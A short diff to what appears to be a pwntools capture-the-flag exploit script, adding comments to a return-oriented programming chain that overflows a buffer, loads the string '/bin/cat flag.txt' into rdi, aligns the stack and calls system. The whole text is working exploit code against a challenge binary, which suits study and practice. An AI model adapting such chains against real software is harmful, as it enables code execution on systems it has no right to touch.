@@ -10,8 +10,11 @@ context.binary = BINARY
 p = process(BINARY)
 
 rop = b"A" * 40
+# Putting "/bin/cat flag.txt" in rdi 
 rop += p64(0x4007c3) # pop rdi ; ret
 rop += p64(0x601060) # address of "/bin/cat flag.txt"
+
+# Calling system("/bin/cat flag.txt")
 rop += p64(0x40053e) # ret --> MOVAPS issue
 rop += p64(ELF.symbols["system"])
 
